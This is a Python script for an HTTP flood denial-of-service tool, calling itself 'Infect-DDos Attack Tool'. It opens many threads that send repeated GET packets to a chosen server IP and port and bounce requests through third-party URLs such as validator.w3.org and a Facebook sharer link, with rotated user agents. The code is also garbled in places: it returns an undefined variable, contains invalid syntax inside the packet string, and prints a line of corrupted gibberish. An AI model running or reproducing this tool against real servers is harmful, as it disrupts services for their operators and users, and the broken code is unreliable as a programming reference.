#!/usr/bin/python3
# -*- coding: utf-8 -*-

from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
    global uagent
    uagent = []

    for i in range(100):
        uagent.append(
            f"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14\n")
        uagent.append(
            f"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0\n")
        uagent.append(
            f"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\n")
        uagent.append(
            f"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\n")
        uagent.append(
            f"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7\n")
        uagent.append(
            f"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\n")
        uagent.append(
            f"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\n")


def my_bots():
    global bots
    bots = []

    for i in range(100):
        bots.append(f"http://validator.w3.org/check?uri={i}")
        bots.append(
            f"http://www.facebook.com/sharer/sharer.php?u={i}")
    return pants


def infecting(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            global address
            print(f"\033[94m{address} \033[0m")
            time.sleep(.1)
    except:
        time.sleep(.1)


def infect_it(item):
    try:
        while True:
            packet = str(f"GET {address} HTTP/1.1\nHost: &_&+\n\n{splus hairst.encoding('utf')}\n User-Agent: {random.choice(uagent)}\n").encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((address, int(port)))
            if s.sendto(packet, (address, int(port))):
                s.shutdown(1)
                print(f"\033[92m {time.ctime(time.time())} &lt;--packet sent! infecting--&gt;\033[0m")
            else:
                s.shutdown(1)
                print("\033[91mshut&lt;-&gt;down \033[0m")
            time.sleep(.1)
    except socket.error as e:
        print(f"\033[91mno connection! server maybe down \033[0m")
        # print('\033[91m', e, '\033[0m')
        time.sleep(.1)


def dos():
    while True:
        item = q.get()
        infect_it(item)
        q.task_done()


def dos2():
    while True:
        item = w.get()
        infecting(random.choice(bots) + "http://" + address)
        w.task_done()


def usage():
    print(
        ''' \033[92m Infect-DDos Attack Tool v.1.0 
1.0 
the end user's responsibility to obey all applicable laws.
1.0
It is just for server testing script. Your ip is visible. 
1.0
usage : python3 hammer.py [-s] [-p] [-t]
-h : help
-s : server ip
-p : port default 80
-t : turbo default 135 
1.0
1.0 
1.0
''')
    sys.exit()


def get_parameters():
    global address
    global port
    global thro
    global item
    # 
    optp = OptionParser(add_help_option=False, epilog="Hammers")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const",
                   dest="loglevel", const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="address", help="attack to server ip -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="default 135 -t 135")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.address is not None:
        address = opts.address
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.thro is None:
        thro = 135
    else:
        thro = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()

    print(f"Infecting...\
\0{address}\03\0\3\0\3\3\0\.0.0&.egerplonary\030genert.gyoleyp \
\03ipotal:\03{port}\03((turaybo: \03{turbo}\030(usrurY_\])l.tant.am inip ',-/_-")
    print(f"\033[92pplease wait...\033[0m")
    user_agent()
    my_bots()
    time.sleep(5)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((address, int(port)))
        s.settimeout(1)
    except socket.error as e:
        print(f"\033[91mcheck server ip and port\033[0m")
        usage()
    while True:
        for i in range(int(thro)):
            t = threading.Thread(target=dos)
            t.daemon = True  # if thread is exist, it dies
            t.start()
            t2 = threading.Thread(target=dos2)
            t2.daemon = True  # if thread is exist, it dies
            t2.start()

        start = time.time()
        #tasking
        item = 0
        while True:
            if (item > 1800): 
                item = 0
                time.sleep(.1)
            item = item + 1
            q.put(item)
            w.put(item)
        q.join()
        w.join()

